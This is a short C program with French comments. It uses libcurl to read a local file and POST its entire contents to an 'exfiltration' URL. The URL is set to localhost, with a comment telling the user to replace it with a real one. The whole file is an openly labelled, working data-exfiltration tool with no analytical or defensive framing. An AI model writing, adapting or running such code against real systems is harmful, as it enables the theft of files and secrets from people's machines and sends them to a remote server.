#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
 
// Fonction pour lire le contenu d'un fichier
char* read_file(const char* filename) {
    FILE *file = fopen(filename, "rb");
    if (!file) {
        perror("Erreur lors de l'ouverture du fichier");
        return NULL;
    }
 
    // Se déplacer à la fin du fichier pour obtenir sa taille
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    rewind(file);
 
    // Allouer la mémoire pour stocker le contenu
    char *content = malloc(file_size + 1);
    if (!content) {
        perror("Erreur d'allocation de mémoire");
        fclose(file);
        return NULL;
    }
 
    // Lire le contenu du fichier
    fread(content, 1, file_size, file);
    content[file_size] = '\0'; // Ajouter un caractère de fin
 
    fclose(file);
    return content;
}
 
// Fonction pour exfiltrer les données via HTTP POST
void exfiltrate_data(const char* url, const char* data) {
    CURL *curl;
    CURLcode res;
 
    curl = curl_easy_init();
    if(curl) {
        // Définir l'URL cible
        curl_easy_setopt(curl, CURLOPT_URL, url);
 
        // Spécifier les données POST
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
 
        // Exécuter la requête
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "Erreur CURL: %s\n", curl_easy_strerror(res));
        }
 
        // Nettoyer la session CURL
        curl_easy_cleanup(curl);
    }
}
 
int main() {
    // Chemin du fichier à exfiltrer
    const char *filename = "fichier_a_exfiltrer.txt";
 
    // URL de destination (serveur distant ou endpoint API)
    const char *exfiltration_url = "http://localhost:8080/exfiltration"; // Remplacer par une vraie URL
 
    // Lire le contenu du fichier
    char *file_content = read_file(filename);
    if (file_content) {
        // Exfiltrer les données
        printf("Exfiltrating data to %s\n", exfiltration_url);
        exfiltrate_data(exfiltration_url, file_content);
 
        // Libérer la mémoire allouée
        free(file_content);
    } else {
        printf("Erreur : Impossible de lire le fichier.\n");
    }
 
    return 0;
}